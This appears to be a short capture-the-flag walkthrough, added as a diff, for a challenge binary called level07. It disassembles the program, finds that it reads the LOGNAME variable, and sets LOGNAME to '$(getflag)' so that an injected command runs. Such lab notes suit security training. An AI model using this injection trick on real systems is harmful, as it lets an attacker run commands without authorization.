@@ -1,0 +1,8 @@
+./level07
+    -> level07
+objdump -d -Mintel
+    ->  804856f:       c7 04 24 80 86 04 08    mov    DWORD PTR [esp],0x8048680
+        8048576:       e8 85 fe ff ff          call   8048400 <getenv@plt>
+gdb level07 -ex "x/s 0x8048680" -ex quit
+    -> 0x8048680:       "LOGNAME"
+export LOGNAME='$(getflag)'
